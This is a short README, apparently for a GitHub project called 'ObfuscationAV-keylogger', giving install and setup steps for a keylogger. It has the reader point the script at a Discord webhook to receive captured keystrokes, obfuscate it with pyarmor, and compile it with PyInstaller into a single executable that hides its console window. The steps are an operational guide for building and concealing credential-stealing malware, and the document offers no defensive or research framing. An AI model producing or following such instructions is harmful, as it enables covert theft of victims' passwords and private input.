## üîß Installation

### 1Ô∏è‚É£ Clone the Repository

```bash
git clone https://github.com/TheOnlySyntax/ObfuscationAV-keylogger
cd ObfuscationAV-keylogger
```

### 2Ô∏è‚É£ Install Dependencies

```bash
pip install pynput requests pyinstaller pyarmor
```

---

## ‚öôÔ∏è Setup

### üîπ 1. Configure the Discord Webhook

Open `keyloggerAV.py` and locate:
```python
WEBHOOK_URL = "https://discord.com/api/webhooks/your_webhook_url"
```
Replace `your_webhook_url` with your actual webhook URL.

### üîπ 2. (Optional) Obfuscate the Code

For added security, run:
```bash
pyarmor gen keyloggerAV.py
```
An obfuscated version will appear in the `dist` folder.

### üîπ 3. Compile to Executable

```bash
pyinstaller --onefile --noconsole --hidden-import=requests --hidden-import=pynput keyloggerAV.py
```
- `--onefile`: Bundles everything into one `.exe`.
- `--noconsole`: Hides the terminal.
- `--hidden-import`: Ensures dependencies are included.

The compiled `.exe` will be in the `dist` folder.
